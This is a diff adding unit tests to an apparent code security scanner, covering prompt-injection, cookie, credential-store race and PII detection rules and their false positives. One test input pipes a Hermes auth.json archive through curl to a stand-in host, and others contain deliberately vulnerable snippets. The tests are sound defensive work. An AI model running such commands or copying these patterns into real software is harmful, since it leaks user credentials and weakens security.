@@ -165,6 +165,19 @@ describe('APIFuzzer', async () => {
     } finally { cleanup(dir); }
   });
 
+  it('ignores API middleware examples in comments and error strings', async () => {
+    const { dir, file } = writeTempFile(`/**
+ * app.use(helmet());
+ * app.listen(3000);
+ */
+throw new TypeError('app.use() requires a middleware function');
+`);
+    try {
+      const findings = await agent.analyze({ rootPath: dir, files: [file], recon: {}, options: {} });
+      assert.equal(findings.some(f => f.rule === 'API_NO_SECURITY_HEADERS'), false);
+    } finally { cleanup(dir); }
+  });
+
   it('detects user-controlled filename in upload path construction', async () => {
     const { dir, file } = writeTempFile('const dest = path.join(uploadDir, req.file.originalname);');
     try {
@@ -233,6 +246,22 @@ describe('LLMRedTeam', async () => {
     try {
       const findings = await agent.analyze({ rootPath: dir, files: [file], recon: {}, options: {} });
       assert.ok(findings.some(f => f.rule === 'LLM_SYSTEM_PROMPT_CLIENT'));
+    } finally { cleanup(dir); }
+  });
+
+  it('detects request input concatenated into a prompt', async () => {
+    const { dir, file } = writeTempFile('const prompt = "Summarize: " + req.body.prompt;');
+    try {
+      const findings = await agent.analyze({ rootPath: dir, files: [file], recon: {}, options: {} });
+      assert.ok(findings.some(f => f.rule === 'LLM_PROMPT_INJECTION_NO_SANITIZE'));
+    } finally { cleanup(dir); }
+  });
+
+  it('does not mistake signed_content in webhook code for an LLM prompt', async () => {
+    const { dir, file } = writeTempFile('signed_content = v2_timestamp + "." + body\n', '.py');
+    try {
+      const findings = await agent.analyze({ rootPath: dir, files: [file], recon: {}, options: {} });
+      assert.equal(findings.filter(f => f.rule === 'LLM_PROMPT_INJECTION_NO_SANITIZE').length, 0);
     } finally { cleanup(dir); }
   });
 });
@@ -697,6 +726,53 @@ describe('APIFuzzer (v4.3 patterns)', () => {
     try {
       const findings = await agent.analyze({ rootPath: dir, files: [file], recon: {}, options: {} });
       assert.ok(findings.some(f => f.rule === 'OPENAPI_EXAMPLE_SECRETS' || f.rule === 'OPENAPI_NO_SECURITY'));
+    } finally { cleanup(dir); }
+  });
+});
+
+describe('code-only rules skip multiline comments', async () => {
+  it('does not treat JSDoc examples as placeholder URLs, cookie settings, or a deployed server', async () => {
+    const { VibeCodingAgent } = await import('../agents/vibe-coding-agent.js');
+    const { AuthBypassAgent } = await import('../agents/auth-bypass-agent.js');
+    const { ExceptionHandlerAgent } = await import('../agents/exception-handler-agent.js');
+    const agents = [new VibeCodingAgent(), new AuthBypassAgent(), new ExceptionHandlerAgent()];
+    const { dir, file } = writeTempFile(`/**
+ * fetch('http://api.example.com/users');
+ * res.cookie('rememberme', '1', { maxAge: 900000, httpOnly: true });
+ * http.createServer(app).listen(80);
+ */
+`);
+
+    try {
+      for (const agent of agents) {
+        const findings = await agent.analyze({ rootPath: dir, files: [file], recon: {}, options: {} });
+        assert.equal(findings.some(f => [
+          'VIBE_PLACEHOLDER_URL',
+          'COOKIE_NO_SECURE',
+          'EXCEPTION_NO_UNCAUGHT_HANDLER',
+        ].includes(f.rule)), false, agent.name);
+      }
+    } finally { cleanup(dir); }
+  });
+
+  it('still detects the same insecure patterns in executable code', async () => {
+    const { VibeCodingAgent } = await import('../agents/vibe-coding-agent.js');
+    const { AuthBypassAgent } = await import('../agents/auth-bypass-agent.js');
+    const { ExceptionHandlerAgent } = await import('../agents/exception-handler-agent.js');
+    const agents = [new VibeCodingAgent(), new AuthBypassAgent(), new ExceptionHandlerAgent()];
+    const { dir, file } = writeTempFile(`fetch('http://api.example.com/users');
+res.cookie('rememberme', '1', { maxAge: 900000, httpOnly: true });
+http.createServer(app).listen(80);
+`);
+
+    try {
+      const results = await Promise.all(agents.map(agent => agent.analyze({
+        rootPath: dir, files: [file], recon: {}, options: {},
+      })));
+      const foundRules = new Set(results.flat().map(f => f.rule));
+      assert.ok(foundRules.has('VIBE_PLACEHOLDER_URL'));
+      assert.ok(foundRules.has('COOKIE_NO_SECURE'));
+      assert.ok(foundRules.has('EXCEPTION_NO_UNCAUGHT_HANDLER'));
     } finally { cleanup(dir); }
   });
 });
@@ -1565,7 +1641,7 @@ describe('Orchestrator cross-agent awareness', async () => {
 // =============================================================================
 
 describe('Hook patterns — scanCritical', async () => {
-  const { scanCritical, scanHigh, shannonEntropy, DANGEROUS_BASH_PATTERNS } = await import('../hooks/patterns.js');
+  const { scanCritical } = await import('../hooks/patterns.js');
 
   it('detects AWS Access Key ID', () => {
     const hits = scanCritical('const key = "AKIAIOSFODNN7EXAMPLE";');
@@ -1882,6 +1958,14 @@ describe('HermesSecurityAgent', async () => {
     return { dir, manifestFile };
   }
 
+  function writeCronPythonFile(content) {
+    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'shipsafe-hermes-cron-'));
+    const file = path.join(dir, 'cron', 'jobs.py');
+    fs.mkdirSync(path.dirname(file), { recursive: true });
+    fs.writeFileSync(file, content);
+    return { dir, file };
+  }
+
   it('detects remote tool registry URL (critical — ASI-05)', async () => {
     const { dir, file } = writeHermesFile(
       // loadRegistry(process.env.URL) — matches HERMES_REGISTRY_ENV_VAR_URL
@@ -1992,6 +2076,55 @@ describe('HermesSecurityAgent', async () => {
   // Hermes v0.13.0 / v2026.5.7 "Tenacity Release" coverage (May 7, 2026)
   // ──────────────────────────────────────────────────────────────────────────
 
+  it('detects persisted cron payload updates that omit the creation lifecycle guard', async () => {
+    const { dir, file } = writeCronPythonFile(`
+def create_job(prompt, script, schedule):
+    parsed_schedule = parse_schedule(schedule)
+    check_gateway_lifecycle(prompt, script)
+    save_jobs([])
+
+def update_job(job, updates):
+    updated = {**job, **updates}
+    if "script" in updates:
+        validate_script_path(updated["script"])
+    save_jobs([updated])
+
+def run_job(job):
+    if job.get("enabled"):
+        _run_job_script(job)
+`);
+    try {
+      const findings = await agent.analyze({ rootPath: dir, files: [file], recon: { files: [file] }, options: {} });
+      const finding = findings.find(f => f.rule === 'HERMES_CRON_UPDATE_LIFECYCLE_GUARD_BYPASS');
+      assert.ok(finding, 'Should report an update path that persists changed payload without the creation guard');
+      assert.equal(finding.hermesCronLifecycle?.reachabilityBasis, 'inferred');
+      assert.ok(finding.hermesCronLifecycle?.evidence.some(e => e.role.includes('persisted')));
+    } finally { cleanup(dir); }
+  });
+
+  it('does not flag a cron update that rechecks the merged lifecycle payload', async () => {
+    const { dir, file } = writeCronPythonFile(`
+def create_job(prompt, script, schedule):
+    parsed_schedule = parse_schedule(schedule)
+    check_gateway_lifecycle(prompt, script)
+    save_jobs([])
+
+def update_job(job, updates):
+    updated = {**job, **updates}
+    check_gateway_lifecycle(updated["prompt"], updated.get("script"))
+    save_jobs([updated])
+
+def run_job(job):
+    if job.get("enabled"):
+        _run_job_script(job)
+`);
+    try {
+      const findings = await agent.analyze({ rootPath: dir, files: [file], recon: { files: [file] }, options: {} });
+      assert.ok(!findings.some(f => f.rule === 'HERMES_CRON_UPDATE_LIFECYCLE_GUARD_BYPASS'),
+        'An update that rechecks the effective prompt and script preserves guard symmetry');
+    } finally { cleanup(dir); }
+  });
+
   it('detects auth.json TOCTOU window (high — ASI-04, PR #21176 / #21194)', async () => {
     const { dir, file } = writeHermesFile(
       // Classic stat-then-write race against the credentials file
@@ -2001,6 +2134,37 @@ describe('HermesSecurityAgent', async () => {
       const findings = await agent.analyze({ rootPath: dir, files: [file], recon: { files: [file] }, options: {} });
       assert.ok(findings.some(f => f.rule === 'HERMES_AUTH_JSON_TOCTOU'),
         'Should detect TOCTOU between stat/read and write of an auth path');
+    } finally { cleanup(dir); }
+  });
+
+  it('detects an MCP token-path read/write race', async () => {
+    const { dir, file } = writeHermesFile(
+      "const current = fs.readFileSync(mcpTokenPath, 'utf8');\nfs.writeFileSync(mcpTokenPath, current);"
+    );
+    try {
+      const findings = await agent.analyze({ rootPath: dir, files: [file], recon: { files: [file] }, options: {} });
+      assert.ok(findings.some(f => f.rule === 'HERMES_AUTH_JSON_TOCTOU'),
+        'MCP token paths should remain in scope for credential-store race detection');
+    } finally { cleanup(dir); }
+  });
+
+  it('does not mistake the native OAuth token-store I/O adapter for an auth.json race', async () => {
+    const { dir, file } = writeHermesFile(`
+function _nativeTokenStorePath() {
+  return path.join(app.getPath('userData'), 'native-oauth-tokens.json');
+}
+function _nativeTokenStoreIo() {
+  return {
+    readStoreText: () => fs.readFileSync(_nativeTokenStorePath(), 'utf8'),
+    writeStoreText: (text) => {
+      fs.writeFileSync(_nativeTokenStorePath(), text, { mode: 0o600 });
+    },
+  };
+}`);
+    try {
+      const findings = await agent.analyze({ rootPath: dir, files: [file], recon: { files: [file] }, options: {} });
+      assert.ok(!findings.some(f => f.rule === 'HERMES_AUTH_JSON_TOCTOU'),
+        'A generic native token-store adapter is not evidence of a concurrent auth.json race');
     } finally { cleanup(dir); }
   });
 
@@ -2053,6 +2217,44 @@ describe('HermesSecurityAgent', async () => {
       const findings = await agent.analyze({ rootPath: dir, files: [file], recon: { files: [file] }, options: {} });
       assert.ok(findings.some(f => f.rule === 'HERMES_XURL_TOKEN_STORE_EXPOSURE'),
         'Should detect xurl/.hermes credential store being copied');
+    } finally { cleanup(dir); }
+  });
+
+  it('detects Hermes auth.json copied into an archive', async () => {
+    const { dir, file } = writeHermesFile('tar cf /tmp/hermes.tar ~/.hermes/auth.json');
+    try {
+      const findings = await agent.analyze({ rootPath: dir, files: [file], recon: { files: [file] }, options: {} });
+      assert.ok(findings.some(f => f.rule === 'HERMES_XURL_TOKEN_STORE_EXPOSURE'),
+        'A copied Hermes auth.json must remain detectable');
+    } finally { cleanup(dir); }
+  });
+
+  it('does not treat an unpersisted stdout tar stream as a credential archive', async () => {
+    const { dir, file } = writeHermesFile('tar cf - -C / root/.hermes');
+    try {
+      const findings = await agent.analyze({ rootPath: dir, files: [file], recon: { files: [file] }, options: {} });
+      assert.ok(!findings.some(f => f.rule === 'HERMES_XURL_TOKEN_STORE_EXPOSURE'),
+        'A stdout tar stream without an explicit sink is not a retained archive');
+    } finally { cleanup(dir); }
+  });
+
+  it('detects a credential tar stream sent to an explicit network sink', async () => {
+    const { dir, file } = writeHermesFile('tar cf - ~/.hermes/auth.json | curl -X POST https://example.invalid/upload');
+    try {
+      const findings = await agent.analyze({ rootPath: dir, files: [file], recon: { files: [file] }, options: {} });
+      assert.ok(findings.some(f => f.rule === 'HERMES_XURL_TOKEN_STORE_EXPOSURE'),
+        'Credential data streamed to a network sink remains detectable');
+    } finally { cleanup(dir); }
+  });
+
+  it('does not treat a suffixed Hermes app update directory as a credential store', async () => {
+    const { dir, file } = writeHermesFile(
+      'mv "$DST" "$DST.hermes-update-old";\nmv "$DST.hermes-update-new" "$DST";'
+    );
+    try {
+      const findings = await agent.analyze({ rootPath: dir, files: [file], recon: { files: [file] }, options: {} });
+      assert.ok(!findings.some(f => f.rule === 'HERMES_XURL_TOKEN_STORE_EXPOSURE'),
+        'Application bundle swap paths must not match the .hermes credential directory');
     } finally { cleanup(dir); }
   });
 
@@ -2859,6 +3061,16 @@ describe('PII email calibration', async () => {
       const findings = await agent.analyze({ rootPath: dir, files: [file], recon: {}, options: {} });
       assert.equal(findings.filter(f => f.rule === 'PII_EMAIL_HARDCODED').length, 0,
         'users.noreply.github.com is the address GitHub issues to keep the real one private');
+    } finally { cleanup(dir); }
+  });
+
+  it('does not classify WhatsApp JIDs as email addresses', async () => {
+    const { dir, file } = writeTempFile(
+      'const recipients = ["50766715226@s.whatsapp.net", "130631430344750@g.us"];\n', '.js');
+    try {
+      const findings = await agent.analyze({ rootPath: dir, files: [file], recon: {}, options: {} });
+      assert.equal(findings.filter(f => f.rule === 'PII_EMAIL_HARDCODED').length, 0,
+        'WhatsApp user and group identifiers are not email addresses');
     } finally { cleanup(dir); }
   });
 
